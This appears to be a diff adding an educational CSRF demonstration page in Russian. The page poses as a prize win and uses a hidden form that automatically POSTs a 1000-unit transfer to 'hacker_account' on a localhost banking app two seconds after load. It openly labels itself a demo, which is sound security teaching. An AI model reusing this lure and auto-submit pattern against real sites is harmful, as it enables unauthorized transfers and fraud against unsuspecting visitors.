@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Вы выиграли приз!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        }
+        h1 {
+            font-size: 48px;
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        .prize {
+            font-size: 24px;
+            margin: 20px 0;
+            font-weight: bold;
+        }
+        .button {
+            background: #ff6b6b;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 25px;
+            font-size: 18px;
+            cursor: pointer;
+            margin: 20px;
+            transition: background 0.3s;
+        }
+        .button:hover {
+            background: #ff5252;
+        }
+        .warning {
+            background: rgba(255, 193, 7, 0.2);
+            border: 1px solid #ffc107;
+            color: #fff3cd;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 20px 0;
+            font-size: 14px;
+        }
+        .loading {
+            display: none;
+            margin: 20px 0;
+        }
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 4px solid white;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎉 ПОЗДРАВЛЯЕМ! 🎉</h1>
+        <div class="prize">
+            Вы выиграли 1000 рублей на ваш банковский счет!
+        </div>
+        <p>Нажмите кнопку ниже, чтобы получить свой приз немедленно!</p>
+
+        <div class="warning">
+            <strong>ВНИМАНИЕ:</strong> Это демонстрация CSRF-атаки. Страница автоматически выполнит вредоносное действие.
+        </div>
+
+        <button class="button" onclick="claimPrize()">Получить приз</button>
+
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>Обработка...</p>
+        </div>
+
+        <p style="font-size: 12px; margin-top: 30px; opacity: 0.7;">
+            Это вредоносная страница, демонстрирующая CSRF-атаку на уязвимое банковское приложение.
+        </p>
+    </div>
+
+    <form id="csrfAttack" action="http://localhost:3000/transfer" method="POST" style="display: none;">
+        <input type="hidden" name="amount" value="1000">
+        <input type="hidden" name="to_account" value="hacker_account">
+    </form>
+
+    <script>
+        let attackTriggered = false;
+
+        function claimPrize() {
+            if (attackTriggered) return;
+            attackTriggered = true;
+
+            document.querySelector('.button').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+
+            setTimeout(() => {
+                document.getElementById('csrfAttack').submit();
+            }, 1000); 
+        }
+
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                if (!attackTriggered) {
+                    claimPrize();
+                }
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
